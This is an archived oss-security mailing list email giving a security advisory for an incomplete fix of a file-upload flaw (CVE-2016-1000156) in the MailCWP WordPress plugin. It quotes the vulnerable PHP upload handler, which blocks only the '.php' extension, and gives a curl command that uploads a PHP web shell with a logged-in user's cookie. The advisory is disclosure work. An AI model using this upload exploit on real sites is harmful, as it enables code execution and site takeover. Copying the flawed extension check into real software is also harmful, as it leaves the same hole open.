X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1704" "Tuesday" "8" "November" "2016" "05:40:55" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>" "52" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" nil nil nil "11" "2016110810:40:55" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" (number mark "U       larry0@me.co Nov  8   52/1704  " thread-indent "\"[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7880 invoked by uid 550); 8 Nov 2016 10:41:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7862 invoked from network); 8 Nov 2016 10:41:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1478601658; bh=EBEaIsXPaEBU/n9LgNB/nSRUCsXHESF8gEyxZuRdti0=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=GVmjaIdSUytc23zO7CqXi4SElUFes+jjAMHQaljkJnpz0Gnu4t63Os2DvnSJmb/7e
 chRFqSeeDSnLwAzhpcWRQG4UmBs+WnVWpjD7gTU+mslG989hMhH/1YcLUGWuN6v1nA
 F+t8ndXZxCiavpQeDEkkzzXntCqvqmjCJhUoYhYPS8AgnNNgSfxfkIm/5OV+VvHPhs
 fJ+eW3Zvp5UtJIRelcU677vWoYDqLy26j3MZy7psi+Br1SBnDQtGNr8bjFhIV3hthL
 xUfzTG/c8i3XTEIAUoVYJkDRZF1s2qMKMZEj2PCa5uA6ThCkzvDTUolfB/Jemtb9G3
 6LuNbNE4voySw==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-11-08_03:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1611080197
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>
Date: Tue, 08 Nov 2016 05:40:55 -0500
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100

Title: Mailcwp remote file upload vulnerability incomplete fix v1.100
Author: Larry W. Cashdollar, @_larry0
Date: 2016-11-01
Download Site: https://wordpress.org/plugins/mailcwp/
Vendor: CadreWorks Pty Ltd
Vendor Notified: 2016-11-01
Vendor Contact: plugins@wordpress.org
Description: MailCWP, Mail Client for WordPress. A full-featured mail clien=
t plugin providing webmail access through your WordPress blog or website.
Vulnerability:
I noticed CVE-2015-1000000 wasn't fixed correctly, _any_ authenticated user=
 can upload a file to the WordPress installation, they can get .php code ex=
ecution by changing the extension to .php[3-5], .pht or .phtml.

My previous advisory:

http://www.vapidlabs.com/advisory.php?v=3D138


require_once "../../../wp-load.php";

if (!is_user_logged_in()) {
  die('{"ERROR": -1}');
}

$message_id =3D $_REQUEST["message_id"];
$upload_dir =3D $_REQUEST["upload_dir"];
if (empty($_FILES) || $_FILES["file"]["error"]) {
  die('{"OK": 0}');
}
=20
$fileName =3D $_FILES["file"]["name"];
$ext =3D pathinfo($fileName, PATHINFO_EXTENSION);
if ($ext =3D=3D 'php') {
  die('{"ERROR": -2}');
}
move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$f=
ileName");
=20
die('{"OK": 1}');

CVE-2016-1000156
Exploit Code:
	=E2=80=A2 Create any type of user and copy the contents of your cookie fil=
e for curl:
	=E2=80=A2=20=20
	=E2=80=A2 $ curl   -F "file=3D@/home/larry/shell.php5" "http://example.com=
/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=3D1" -F "upload_d=
ir=3D/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt=20
	=E2=80=A2 {"OK": 1}
Advisory: www.vapidlabs.com/advisory.php?v=3D175
Notes: Incomplete fix for CVE-2015-1000000=
